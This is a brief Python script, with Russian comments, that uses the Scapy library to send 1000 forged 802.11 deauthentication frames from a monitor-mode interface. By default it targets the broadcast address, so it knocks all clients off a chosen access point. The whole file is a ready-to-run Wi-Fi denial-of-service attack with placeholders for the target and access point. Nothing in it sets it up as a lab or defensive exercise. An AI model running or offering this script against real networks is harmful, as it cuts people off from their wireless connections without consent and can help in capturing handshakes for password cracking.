from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth(target_mac, ap_mac, iface):
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=1000, inter=0.1)

# Замените эти параметры
target_mac = "FF:FF:FF:FF:FF:FF"  # Цель
ap_mac = "00:11:22:33:44:55"     # Точка доступа
iface = "wlan0mon"               # Интерфейс

deauth(target_mac, ap_mac, iface)
